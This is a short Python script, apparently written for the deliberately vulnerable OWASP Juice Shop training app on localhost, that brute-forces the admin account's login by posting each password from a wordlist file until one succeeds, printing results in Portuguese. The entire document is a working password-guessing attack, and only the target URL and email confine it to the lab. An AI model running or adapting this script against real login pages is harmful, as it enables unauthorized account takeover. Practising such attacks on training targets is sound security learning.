import requests

url = 'http://localhost:3000/rest/user/login'
email = 'admin@juice-sh.op'

with open('best1050.txt', 'r') as file:
    passwords = file.read().splitlines()

for password in passwords:
    data = {
        'email': email,
        'password': password
    }
    response = requests.post(url, json=data)
    if response.status_code == 200:
        print(f'Senha encontrada: {password}')
        break
    else:
        print(f'Tentativa falhou: {password}')